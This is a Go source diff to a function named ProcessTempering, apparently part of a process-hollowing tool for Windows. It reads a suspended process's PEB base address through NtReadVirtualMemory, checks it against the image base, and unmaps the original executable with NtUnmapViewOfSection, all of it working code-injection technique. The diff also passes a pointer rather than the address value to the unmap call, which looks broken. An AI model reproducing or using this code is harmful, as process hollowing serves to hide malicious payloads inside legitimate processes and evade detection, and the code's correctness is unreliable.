@@ -6,7 +6,6 @@ import (
 	"runtime"
 	"syscall"
 	"unsafe"
-	// "github.com/0xrawsec/golang-win32/win32"
 )
 
 type M128A struct {
@@ -315,48 +314,47 @@ func ProcessTempering() {
 		log.Printf("[+] Process Headers: %v\n", processNTHeaders)
 	}
 
-	var base uintptr
+	// -----------------------------
+	var baseAddress uint64
 	if SYSTEM_64BIT {
-		SIZE_T_SIZE := 8 // 64-bit, 8 bytes
-		PVOID_SIZE := 8  // 64-bit, 8 bytes
-		if result, _, err := ntDLLNtReadVirtualMemory.Call(
+		SIZE_T_SIZE := uint64(8) // 64-bit, 8 bytes
+		if _, _, err := ntDLLNtReadVirtualMemory.Call(
 			uintptr(processInformation.Process),
-			uintptr(context.Rdx+(uint64)(SIZE_T_SIZE*2)),
-			uintptr(unsafe.Pointer(&base)),
-			uintptr(PVOID_SIZE),
-			uintptr(0),
+			uintptr(context.Rdx+(SIZE_T_SIZE*2)),
+			uintptr(unsafe.Pointer(&baseAddress)), // <--- PEB struct
+			uintptr(unsafe.Sizeof(baseAddress)),   // <--- PEB struct size
+			uintptr(0),                            // (optional)
 		); err != syscall.Errno(0) {
 			log.Panicf("[-] Error while reading the virtual memory of the process: %v\n", err)
 			_ = syscall.TerminateProcess(processInformation.Process, 1)
 			return
 		} else {
-			log.Printf("[+] Base Address(x64): 0x%X\n", result)
+			log.Printf("[+] Base Address(x64): 0x%X\n", baseAddress)
 			log.Printf("[+] context.Rdx: 0x%X\n", context.Rdx)
 		}
 	} else if SYSTEM_32BIT {
-		// SIZE_T_SIZE := 4 // 32-bit, 4 bytes
-		PVOID_SIZE := 4 // 32-bit, 4 bytes
-		if result, _, err := ntDLLNtReadVirtualMemory.Call(
+		SIZE_T_SIZE := uint64(4) // 32-bit, 4 bytes
+		if _, _, err := ntDLLNtReadVirtualMemory.Call(
 			uintptr(processInformation.Process),
-			uintptr(context.Rbx+8),
-			uintptr(unsafe.Pointer(&base)),
-			uintptr(PVOID_SIZE),
+			uintptr(context.Rbx+(SIZE_T_SIZE*2)),
+			uintptr(unsafe.Pointer(&baseAddress)),
+			uintptr(unsafe.Sizeof(baseAddress)),
 			uintptr(0),
 		); err != syscall.Errno(0) {
 			log.Panicf("[-] Error while reading the virtual memory of the process: %v\n", err)
 			_ = syscall.TerminateProcess(processInformation.Process, 1)
 			return
 		} else {
-			log.Printf("[+] Base Address(x86): %v\n", result)
+			log.Printf("[+] Base Address(x86): %v\n", baseAddress)
 		}
 	}
 
 	// Unmap the original executable image from the target process if its base address matches
-	if uint32(base) == processNTHeaders.IMAGE_OPTIONAL_HEADER.ImageBase {
-		log.Printf("[+] Unmapping the original executable image from the target process: %v\n", base)
+	if uint32(baseAddress) == processNTHeaders.IMAGE_OPTIONAL_HEADER.ImageBase {
+		log.Printf("[+] Unmapping the original executable image from the target process: %v\n", baseAddress)
 		if result, _, err := ntDLLNtUnmapViewOfSection.Call(
 			uintptr(processInformation.Process),
-			uintptr(unsafe.Pointer(&base)),
+			uintptr(unsafe.Pointer(&baseAddress)),
 		); err != syscall.Errno(0) {
 			log.Panicf("[-] Error while unmapping the original executable image from the target process: %v\n", err)
 			_ = syscall.TerminateProcess(processInformation.Process, 1)
